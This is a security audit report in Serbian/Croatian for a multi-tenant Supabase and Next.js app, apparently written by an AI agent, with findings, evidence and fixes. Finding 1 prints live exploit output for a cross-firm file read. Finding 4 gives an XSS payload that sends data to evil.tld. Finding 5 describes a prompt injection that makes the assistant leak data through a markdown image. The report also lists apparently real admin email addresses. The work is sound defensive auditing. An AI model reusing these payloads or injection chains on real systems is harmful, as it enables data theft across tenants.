# Sigurnosni audit — TEHPRO MVP

> **Status popravki (31.07.2026.)** — sve napisano i provjereno u kodu; migracije čekaju primjenu.
>
> | # | Nalaz | Kod | Migracija | Primijenjeno na bazu |
> |---|---|---|---|---|
> | 1 | Unakrsni pristup dokumentima | ✅ `putanjaUOpsegu` + obje rute | `20260731100000` | ⏳ čeka odobrenje |
> | 3 | Anon-revoke drift | — | `20260731101000` | ⏳ čeka odobrenje |
> | 2 | DEFINER RPC bez provjere | — | `20260731102000` | ⏳ čeka odobrenje |
> | 6 | Deaktivacija / `klijenti_ins` | ✅ `signOut` u `postaviAktivan` | `20260731103000` | ⏳ čeka odobrenje |
> | 7 | Sigurnosna zaglavlja | ✅ `next.config.ts` | — | n/p |
> | 4 | XSS preko `.docx` | ✅ `lib/html-sanitize.ts` + 2 poziva | — | n/p |
> | 5 | Eksfiltracija u asistentu | ✅ `img: () => null` | — | n/p |
> | 8 | Preširoki grantovi | — | `20260731104000` | ⏳ čeka odobrenje |
> | — | Sprečavanje ponavljanja | ✅ pravilo `definer-bez-anon-revokea` | — | n/p |
>
> Provjere nakon izmjena: `typecheck` čist · `lint` 0 grešaka · **966 unit** (+21 novih) ·
> **31 e2e** (sigurnosni + dokumenti) 0 padova · `provjeri:integraciju` čisto.
>
> **Primjena migracija je blokirana permission klasifikatorom** (`pnpm db:apply-cloud`),
> kao i čitanje PROD-a. Redoslijed kad se odobri: `100000` → `101000` → `102000` →
> `103000` → `104000`, prvo na DEMO, pa provjera, pa PROD.
>
> Nakon primjene `20260731100000` na DEMO ponoviti dokaz — mora pasti na koraku NAPAD:
> `pnpm tsx scripts/audit/provjera-storage-path.ts`

- **Datum:** 31.07.2026.
- **Grana / commit:** `audit/sigurnost` @ `9434862` (identično `origin/main`)
- **Obim:** kod (auth, rute, server akcije, RLS/SQL, tajne, integracije) + zavisnosti + živa provjera baze + sigurnosni e2e
- **Baza:** sve provjere i dokazi rađeni protiv **DEMO** (`mtwwotmwrasozmcgqwhc`). **PROD nije provjeren** — vidi „Rupa u pokrivenosti".

Metod: statička analiza cijelog koda u pet paralelnih pregleda, pa **provjera svakog nalaza protiv žive baze**. Dva nalaza iz statičke analize su ovom provjerom oborena (bila su tačna prema migracijama, ali ne prema stvarnom stanju baze) — ispravke su niže.

---

## Sažetak

| # | Nalaz | Težina | Status dokaza |
|---|---|---|---|
| 1 | Unakrsni pristup dokumentima druge firme preko `dokumenti.storage_path` | **VISOKA** | **Potvrđeno živim exploitom** |
| 2 | Tri `SECURITY DEFINER` RPC-a cure osoblje + sve `klijent_id` svakom prijavljenom | SREDNJA | **Potvrđeno živim pozivom** |
| 3 | Repo↔baza drift: anon-revoke migracija primijenjena, ali ne postoji u repou | SREDNJA | Potvrđeno (fajl ne postoji, baza zakrpljena) |
| 4 | Stored XSS: `.docx` → mammoth → `dangerouslySetInnerHTML` | SREDNJA | Ponor potvrđen u kodu |
| 5 | Eksfiltracija preko markdown slike u odgovoru asistenta | SREDNJA | Ponor potvrđen u kodu |
| 6 | Deaktivirani korisnik zadržava sesiju + `klijenti_ins` ne traži `aktivan` | SREDNJA | Politika potvrđena u živoj bazi |
| 7 | Nema nijednog sigurnosnog zaglavlja (CSP, HSTS, X-Frame-Options…) | SREDNJA | Potvrđeno |
| 8 | `anon`/`authenticated` imaju pun DML + TRUNCATE na svim tabelama | NISKA | Potvrđeno u živoj bazi |

Zavisnosti: 13 „high" + 6 „moderate", **sve tranzitivne i nijedna dostupna napadaču** u ovoj konfiguraciji (detalji niže).

---

## 1. VISOKA — Unakrsni pristup dokumentima druge firme

**Gdje:** `dokumenti.storage_path` (bez ograničenja), politika `dokumenti_ins`, `ima_pristup_dokumentu(p_path)`, `lib/supabase/storage.ts:41`

Pristup fajlovima se izvodi iz tabele `dokumenti`, a ne iz same putanje:

```sql
create function ima_pristup_dokumentu(p_path text) returns boolean ... as $$
  select exists (select 1 from dokumenti d
                 where d.storage_path = p_path and ima_pristup_klijentu(d.klijent_id));
$$;
```

Politika upisa ograničava **samo** `klijent_id`, nikad `storage_path`:

```sql
create policy dokumenti_ins on dokumenti for insert
  with check ( ima_pristup_klijentu(klijent_id) and not je_pregled() );
```

Provjereno u živoj bazi: na `dokumenti` **ne postoji** ni unique indeks na `storage_path`, ni CHECK koji veže putanju za `klijent_id`, ni triger koji je zaključava. Operater zato može upisati **tuđu** putanju u **svoj** red i time sam sebi izdati dozvolu.

### Dokaz (izvršeno na DEMO, sve počišćeno)

```
KONTROLA — O čita dokument firme B direktno:            200 []          ← RLS radi
KONTROLA — O potpisuje fajl firme B PRIJE napada:       400 NoSuchKey   ← storage odbija

NAPAD — O upisuje tuđi storage_path pod svoju firmu:    201 Created

ISHOD — O potpisuje fajl firme B POSLIJE napada:        200 signedURL
        PREUZIMANJE fajla firme B:                      200, 15 bajtova
```

Napadač je operater dodijeljen **samo** firmi A. Prije napada nije mogao ni vidjeti ni potpisati fajl firme B. Poslije jednog `INSERT`-a — može ga preuzeti. Isto vrijedi i za `storage_dok_upd`, tj. **prepisivanje** tuđeg nalaza/zapisnika.

**Preduslov, pošteno rečeno:** putanje sadrže `crypto.randomUUID()`, pa se ne pogađaju grubom silom. Napadač mora znati putanju — realno za operatera kojem je firma **ranije bila dodijeljena pa mu je oduzeta** (zbog čega oduzimanje dodjele ne štiti), ili iz logova/backupa. Sam propust u autorizaciji je bezuslovan; samo je korak otkrivanja putanje uslovljen.

**Popravka** (vezati putanju za red u bazi, da ni RLS helper ni service-role potpisnik ne mogu biti navedeni van firme):

```sql
create unique index if not exists uq_dokumenti_storage_path on dokumenti (storage_path);

alter table dokumenti add constraint chk_dokumenti_path_scope check (
      storage_path like 'klijenti/' || klijent_id::text || '/%'
   or (termin_id is not null and storage_path like 'termini/' || termin_id::text || '/%')
) not valid;   -- validate nakon backfilla
```
Plus triger koji na `UPDATE` vraća staru `storage_path` za ne-admine, i provjera prefiksa u `app/api/dokumenti/[id]/route.ts` prije `signedUrl()`.

---

## 2. SREDNJA — `SECURITY DEFINER` RPC-jevi cure osoblje i sve `klijent_id`

**Gdje:** `get_admini()`, `get_aktivni_korisnici()`, `get_zaduzeni_dodjele()`

Sva tri su `SECURITY DEFINER` (zaobilaze RLS), **nemaju nikakvu internu provjeru pozivaoca**, a `authenticated` ih smije izvršiti. Politika `korisnici_sel` inače dozvoljava čitanje samo sebe ili adminu — ovi RPC-jevi je zaobilaze.

### Dokaz (izvršeno na DEMO nalogom `pregled` **bez ijedne dodjele klijenta**)

```
── ANONIMAN (samo anon ključ) ──
  rpc/get_admini              401 permission denied      ← anon je ispravno odsječen
  korisnici / klijenti        401 permission denied

── PRIJAVLJEN kao 'pregled', BEZ dodjela ──
  korisnici                   200 [samo sopstveni red]   ← RLS radi
  klijenti / klijenti_view    200 []                     ← RLS radi
  termini                     200 []                     ← RLS radi

  rpc/get_admini              200 [{"ime":"Demo Administrator","email":"demo@nextpixel.dev"},
                                   {"ime":"E2E Admin","email":"admin@tehpro.test"},
                                   {"ime":"Nikola Milosevic","email":"nmil32@icloud.com"}]
  rpc/get_aktivni_korisnici   200 [cijeli spisak osoblja + UUID-evi]
  rpc/get_zaduzeni_dodjele    200 [sve klijent_id vrijednosti + ko je na kojoj firmi]
```

Korisnik koji ne smije vidjeti **nijednu** firmu dobija imena i **prave e-mail adrese svih administratora** — gotova lista meta za phishing onih koji jedini mogu otvarati naloge — plus kompletan spisak `klijent_id` UUID-eva i mapu zaduženja.

> **Ispravka statičke analize:** dva nezavisna pregleda su ovo ocijenila kao VISOKO uz tvrdnju da je dostupno i **anonimnom** pozivaocu. Živa provjera to obara — na DEMO-u je `anon` revoke primijenjen (`anon=false`), pa je izloženost ograničena na prijavljene korisnike. Otuda SREDNJA, ne VISOKA. Vidi nalaz 3 — za novu instalaciju tvrdnja bi bila tačna.

**Popravka:** dodati `where auth.uid() is not null and je_admin()` (ili barem `auth.uid() is not null`) u tijelo funkcija, da ACL ne bude jedina kontrola; i eksplicitno `revoke ... from public, anon`.

---

## 3. SREDNJA — Repo↔baza drift: anon-revoke postoji u bazi, ne postoji u repou

Migracija `20260729150000_revoke_anon_definer_rpc.sql` se **spominje** u `20260730120000_vremenska_zona_belgrade.sql:11-12`, primijenjena je na žive baze (dokaz: `anon=false` gore), ali **fajl ne postoji ni u repou ni u git historiji** — obrisan je 30.07.

Posljedica: `pnpm db:reset`, nova firma, ili nova Supabase instanca izgrađena iz ovih migracija **ponovo otvara nalaz 2 potpuno anonimnom pozivaocu** (anon ključ je javan, u browser bundle-u). Pošto je kodna baza izričito projektovana za više firmi („same code, many firms"), ovo nije hipotetičko.

Dodatno: obrazac `revoke execute ... from public` je **nedovoljan** na Supabaseu (default privilegije daju EXECUTE direktno roli `anon`, ne preko `PUBLIC`). Repo to zna i piše doslovno u tri druge migracije, ali ova tri RPC-a nisu ispravljena u izvoru.

**Popravka:** vratiti revoke kao commit-ovanu migraciju sa `from public, anon`, i dodati pravilo u `lib/integracija/pravila.ts` koje obara gate kad migracija pravi `security definer` funkciju bez eksplicitnog `anon` revoke-a. Taj lint sloj već čuva `security_invoker` na viewovima — nema pravilo za ACL funkcija, zato je klasa promakla tri puta.

---

## 4. SREDNJA — Stored XSS preko `.docx` pregleda

**Gdje:** `components/domain/DocxPreview.tsx:15` (ponor), `app/api/dokumenti/[id]/pregled/route.ts:63` (izvor)

`mammoth.convertToHtml()` izlaz ide direktno u `dangerouslySetInnerHTML`. Mammoth escapuje `& " < >`, pa proboj atributa nije moguć — ali **ne sanitizuje URL šemu**, pa `href="javascript:..."` preživi. CSP ne postoji (nalaz 7), pa ništa ne blokira izvršenje.

Lanac: operater ubaci `.docx` sa hyperlink poljem `HYPERLINK "javascript:fetch('https://evil.tld/x?d='+...)"` i tekstom „Prilog 1 – zapisnik" → admin otvori pregled na kartici termina → jedan klik izvršava skriptu u origin-u aplikacije pod adminskom sesijom. Admin vidi sve firme, pa payload čita i šalje bilo šta. **Prelazak granice privilegija: operater → admin.** Traži klik, zato SREDNJA a ne VISOKA.

**Popravka:** sanitizovati mammoth izlaz (`sanitize-html`/DOMPurify, `href` samo `http/https/mailto`) prije nego napusti rutu.

---

## 5. SREDNJA — Eksfiltracija preko markdown slike u asistentu

**Gdje:** `components/domain/ChatMessage.tsx:80-89`

`ReactMarkdown` ima override **samo za `a`**; `img` koristi default, pa `![](https://host/…)` postaje `<img>` koji pregledač povlači **bez ikakve interakcije**. Kontekst modela sadrži slobodan tekst nižih uloga (`klijent_naziv`, `lokacija_naziv`… iz `lib/claude/tools.ts:111`), koji operater može upisati.

Lanac: operater preimenuje firmu u injection string → admin pita asistenta bilo šta što povuče `listFirme` → ako model posluša, odgovor sadrži markdown sliku i pregledač tiho GET-uje napadačev URL sa podacima u query stringu. Ponor i kanal injekcije su potvrđeni u kodu; samo je poslušnost modela vjerovatnosna.

**Popravka:** `components={{ img: () => null }}` u `ChatMessage`, plus `img-src 'self' data:` u CSP-u.

---

## 6. SREDNJA — Deaktivacija ne gasi sesiju, a `klijenti_ins` ne traži aktivan nalog

`postaviAktivan()` (`app/(dashboard)/postavke/actions.ts:210`) samo mijenja `korisnici.aktivan = false`. Nikad ne zove `auth.admin.signOut()` — iako se `auth.admin` koristi u istom fajlu. Jedina zaštita je `proxy.ts`, koji je dokumentovano fail-open **i** hvata samo zahtjeve kroz Next aplikaciju; PostgREST se zove direktno.

Većina politika ovo preživi, jer `je_admin()`/`je_pregled()`/`ima_pristup_klijentu()` svi traže `k.aktivan`. Izuzetak je (potvrđeno u živoj bazi):

```sql
klijenti_ins  with check ((auth.uid() IS NOT NULL) AND (NOT je_pregled()))
```

Traži „bilo koji prijavljeni", ne „aktivan profil". Gore: pošto `je_pregled()` **također** traži `aktivan`, deaktiviranjem `pregled` korisnika `je_pregled()` postaje `false` i time mu se ovaj upis **daje** — deaktivacija čini provjeru slabijom, ne jačom.

Scenario: bivši zaposleni sačuva refresh token; admin ga deaktivira; nalog nije odjavljen; token se rotira neograničeno; on nastavlja da ubacuje `klijenti` redove koje svi admini vide. Čitanje je svuda ispravno odbijeno — ovo je trajni kanal upisa.

**Popravka:** `signOut(korisnikId, 'global')` u `postaviAktivan`; i `klijenti_ins` promijeniti na `exists (select 1 from korisnici k where k.id = auth.uid() and k.aktivan)`.

---

## 7. SREDNJA — Nema sigurnosnih zaglavlja

`next.config.ts` nema `headers()` blok, `vercel.json` sadrži samo `regions` + `crons`. Znači: **nema CSP, HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy**. Sam po sebi nije proboj, ali je razlog zašto su nalazi 4 i 5 iskoristivi umjesto ublaženi.

---

## 8. NISKA — `anon` i `authenticated` imaju pun DML + TRUNCATE na svim tabelama

Sve 22 tabele/viewa daju `SELECT/INSERT/UPDATE/DELETE/TRUNCATE/REFERENCES/TRIGGER` i `anon` i `authenticated` roli. RLS je **jedina** barijera. Nije iskoristivo kroz PostgREST (ne izlaže TRUNCATE, a RLS blokira ostalo, što je gore i empirijski potvrđeno), ali `TRUNCATE` **nije podložan RLS-u** — pa svaki budući propust koji dopusti izvršavanje SQL-a odmah postaje potpuno brisanje podataka. Vrijedi suziti na najmanje potrebno.

---

## Zavisnosti (`pnpm audit`)

**13 high, 6 moderate, 0 critical — nijedna dostupna vanjskom napadaču u ovoj konfiguraciji.** Sve su tranzitivne; nijedna nije direktna zavisnost.

| Paket | Lanac | Dostupnost |
|---|---|---|
| `postcss` (2× high, 1 moderate) | `next > postcss` | samo build-time |
| `sharp` (high, libvips CVE-ovi) | `next > sharp` | runtime, ali `next.config.ts` nema `images.remotePatterns` → nema slika pod kontrolom napadača |
| `brace-expansion` (3× high), `js-yaml` (high) | `eslint`, `eslint-config-next` | dev alat |
| `fast-uri` (2× high), `hono` (3× mod), `@hono/node-server` | `shadcn > @modelcontextprotocol/sdk` | dev alat |
| `uuid`, `brace-expansion` | `exceljs > …` | `exceljs` se uvozi samo iz `scripts/` |

Preporuka: rutinski `pnpm update` za `next`/`eslint` lanac; nema hitnosti.

---

## Sigurnosni e2e (DEMO, chromium)

```
13 passed, 1 skipped, 0 failed  (1.1m)
```
Pokrenuto: `17-login`, `18-auth-rls`, `25-nalozi-lozinke`, `26-pregled-readonly`, `27-uloge-ovlastenja`, `31-asistent-pregled`. Sve prolazi — RLS izolacija po dodjeli, `pregled` read-only, 403 na izvoz/preuzimanje, asistent zabranjen za `pregled`. (Puni e2e paket nije pokretan; van obima.)

---

## Provjereno i čisto

- **Tajne:** nijedna nije nikad commit-ovana — skenirano **svih 3.199 blobova** u git object bazi na `sk-ant-`, `re_`, JWT-ove, `AKIA`, `ghp_`: nula pogodaka. `.gitignore` ispravan.
- **Service-role ključ ne može u browser bundle.** Provjereno kroz graf uvoza iz svih 97 `'use client'` ulaza i kroz izvor instaliranog Next 16.2.11 (`getNextPublicEnvironmentVariables()` inline-uje samo `NEXT_PUBLIC_*`; `next.config.ts` nema `env` ključ).
- **Baza, strukturno:** svih 19 tabela ima RLS; **nijedna politika nema `USING (true)`**; sva 3 viewa imaju `security_invoker=on`; **svih 21 `SECURITY DEFINER` funkcija pinuje `search_path`**; bucket `tehpro-dokumenti` je privatan sa MIME allowlistom.
- **Cron i webhook:** `isCronAuthorized` je fail-closed i konstantnog vremena (SHA-256 + `timingSafeEqual`); Resend webhook HMAC-verifikuje **sirovo** tijelo prije bilo kakvog rada.
- **AI:** tools koriste SSR/anon klijent (RLS važi), nijedan alat ne piše, `pregled` dobija 403.
- **Upload/download:** putanje su `<fiksni root>/<uuid>/<uuid>-<safeName>`, `safeName` briše sve van `[\w.\- ]` → traversal nemoguć; potpisani URL-ovi 60 s / 600 s.
- **E-mail:** Resend JSON API → CRLF injekcija nemoguća; primaoci nikad iz zahtjeva; sve interpolacije kroz `escapeHtml`.
- **`exceljs`/XXE:** parser se uvozi samo iz `scripts/` — nijedna ruta ne prima workbook.
- **Nema** `eval`, `new Function`, `vm`, `innerHTML`, ni `rehype-raw`.
- **Pohvala:** `scripts/provjeri-integraciju.ts` statički zabranjuje service-role klijent u `app/`/`components/` bez eksplicitnog opt-out komentara, i to je pod CI gate-om. Dobar dio razloga zašto je granica povjerenja izdržala.

## Poznato i svjesno prihvaćeno (nije novi nalaz)

`pregled` može sačuvati PDF iz pregleda preko potpisanog URL-a, mimo 403 na `/api/dokumenti/[id]`. Ovo je **izričito dokumentovano** u `docs/adr/2026-07-30-pregled-bez-preuzimanja.md` kao prihvaćen kompromis, a e2e ga kodifikuje (`27-uloge-ovlastenja.spec.ts:136`). Jedan od statičkih pregleda ga je prijavio kao novi nalaz — nije.

---

## Rupa u pokrivenosti — PROD nije provjeren

Sve provjere baze rađene su na DEMO. Pokušaj čitanja PROD-a (`fqtqkehjidkzeasiegnq`) blokiran je permission klasifikatorom. **Ovo je važno**, jer se nalazi 2 i 3 tiču upravo drifta između repoa i pojedine baze — DEMO je zakrpljen, a za PROD to **nije potvrđeno**.

Da bi se zatvorilo, treba pokrenuti (samo-za-čitanje) protiv PROD-a:

```bash
PGURL="$(grep -m1 '^DATABASE_URL=' .env.local | cut -d= -f2-)" node ./db-security-lint.mjs
PGURL="…" node ./db-security-lint3.mjs   # EXECUTE grantovi po roli
```

Ako na PROD-u `get_admini` pokaže `anon=true`, nalaz 2 tamo je **VISOK i anoniman**, ne srednji.

---

## Redoslijed popravki

1. **Nalaz 1** — unique indeks + CHECK + triger na `dokumenti.storage_path` (potvrđeno iskoristivo)
2. **Nalaz 3** — vratiti anon-revoke kao migraciju + lint pravilo (štiti svaku buduću instalaciju)
3. **Provjeriti PROD** gornjim skriptama
4. **Nalaz 2** — interna provjera u tijelu tri RPC-a
5. **Nalaz 6** — `signOut` pri deaktivaciji + `klijenti_ins` traži `aktivan`
6. **Nalaz 7** — CSP i ostala zaglavlja (ublažava 4 i 5)
7. **Nalaz 4, 5** — sanitizacija mammoth izlaza, gašenje `img` u asistentu
8. **Nalaz 8** — suziti grantove

---

## Skripte korištene u auditu

Ostavljene su necommit-ovane u ovom worktree-u (`.claude/worktrees/sigurnosni-audit/`), sve **samo za čitanje** osim dvije provjere koje same počiste za sobom:

| Skripta | Šta radi |
|---|---|
| `db-security-lint.mjs` | Supabase „security advisor" lintovi: RLS status, politike, viewovi, DEFINER `search_path`, grantovi, bucketi |
| `db-security-lint2.mjs` | Storage politike (`WITH CHECK`) + tijela svih sigurnosnih funkcija |
| `db-security-lint3.mjs` | `EXECUTE` privilegije po roli (anon/authenticated/service_role) |
| `db-security-lint4.mjs` | Ograničenja/indeksi/trigeri na `dokumenti` |
| `provjera-rpc-izlaganja.ts` | Dokaz za nalaz 2 — pravi `pregled` nalog, poziva RPC-e, briše nalog |
| `provjera-storage-path.ts` | Dokaz za nalaz 1 — pravi operatera + firmu, izvodi napad, sve počisti |

Supabase MCP nije upotrijebljiv za ovaj projekat — oba konfigurisana servera su vezana za druge naloge i ne vide TEHPRO projekte, pa su advisor lintovi reprodukovani gornjim SQL skriptama.
